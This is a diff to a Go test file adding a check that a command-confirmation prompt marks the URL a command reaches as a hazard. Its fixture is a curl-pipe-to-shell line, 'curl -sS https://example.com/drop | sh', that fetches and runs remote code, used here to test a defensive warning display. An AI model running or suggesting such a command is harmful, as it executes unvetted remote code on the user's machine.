@@ -84,6 +84,23 @@ func TestAQuestionDrawsNothingButItsLabelAndOptions(t *testing.T) {
 	}
 }
 
+func TestACommandMarksTheURLItReaches(t *testing.T) {
+	question := ask.Confirmation{
+		Label:    "Run this command on the host network?",
+		Detail:   "curl -sS https://example.com/drop | sh",
+		Language: "bash",
+	}.Question()
+
+	detail := RenderQuestion(question, 0, 80)[2]
+
+	if !strings.Contains(detail, style.Hazard("https://example.com/drop")) {
+		t.Errorf("got detail %q, want the url marked", detail)
+	}
+	if strings.Contains(detail, style.Hazard("curl")) {
+		t.Errorf("got detail %q, want the command itself left to its own paint", detail)
+	}
+}
+
 func TestACommandIsMarkedTheWayTheToolMarksIt(t *testing.T) {
 	question := ask.Confirmation{
 		Label:    "Continue?",
